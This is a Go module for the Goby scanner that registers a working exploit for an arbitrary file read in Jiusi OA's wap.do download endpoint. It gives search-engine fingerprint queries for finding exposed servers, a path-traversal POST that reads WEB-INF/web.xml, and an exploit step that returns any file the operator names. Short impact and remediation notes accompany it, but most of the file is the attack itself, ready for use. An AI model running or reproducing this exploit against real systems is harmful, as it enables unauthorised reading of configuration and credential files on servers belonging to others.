package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Jiusi OA wap.do arbitrary file read vulnerability",
    "Description": "<p>Jiusi OA system is the installation, implementation, learning, operation, maintenance of OA system, developed by Beijing Jiusi Collaborative Software Co., LTD.</p><p>At present, there are arbitrary file reading vulnerabilities in Beijing Jiusi collaborative office software, which can be used by attackers to obtain sensitive server information.</p>",
    "Product": "Jiusi-OA",
    "Homepage": "http://www.jiusi.net/",
    "DisclosureDate": "2022-11-07",
    "PostTime": "2023-08-01",
    "Author": "black@blackhat.net",
    "FofaQuery": "(body=\"九思软件\" && (body=\"OA\" || body=\"办公系统\")) || (header=\"Path=/jsoa\" && header=\"Set-Cookie: JSESSIONID\") || (body=\"<script src=\\\\\\\"/jsoa/webmail/ajax_util.js\\\\\\\"></script>\" && body=\"www.jiusi.net\") || banner=\"/jsoa/login.jsp\"",
    "GobyQuery": "(body=\"九思软件\" && (body=\"OA\" || body=\"办公系统\")) || (header=\"Path=/jsoa\" && header=\"Set-Cookie: JSESSIONID\") || (body=\"<script src=\\\\\\\"/jsoa/webmail/ajax_util.js\\\\\\\"></script>\" && body=\"www.jiusi.net\") || banner=\"/jsoa/login.jsp\"",
    "Level": "2",
    "Impact": "<p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., through this vulnerability, resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>1. Limit the parameters passed in by the user.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jsoa/wap.do?method=downLoad",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "path=../&name=&FileName=/WEB-INF/web.xml"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "UrlRewriteFilter",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "</servlet-name>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/jsoa/wap.do?method=downLoad",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "path=../&name=&FileName={{{file}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "九思 OA wap.do 文件读取漏洞",
            "Product": "九思软件-OA",
            "Description": "<p>九思OA系统是安装、实施、学习、操作、维护的OA系统，由北京九思协同软件有限公司开发。</p><p>当下北京九思协同办公软件存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器敏感信息等。<br></p>",
            "Recommendation": "<p>1、对用户传入的参数进行限制。</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Jiusi OA wap.do arbitrary file read vulnerability",
            "Product": "Jiusi-OA",
            "Description": "<p>Jiusi OA system is the installation, implementation, learning, operation, maintenance of OA system, developed by Beijing Jiusi Collaborative Software Co., LTD.</p><p>At present, there are arbitrary file reading vulnerabilities in Beijing Jiusi collaborative office software, which can be used by attackers to obtain sensitive server information.</p>",
            "Recommendation": "<p>1. Limit the parameters passed in by the user.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc., through this vulnerability, resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}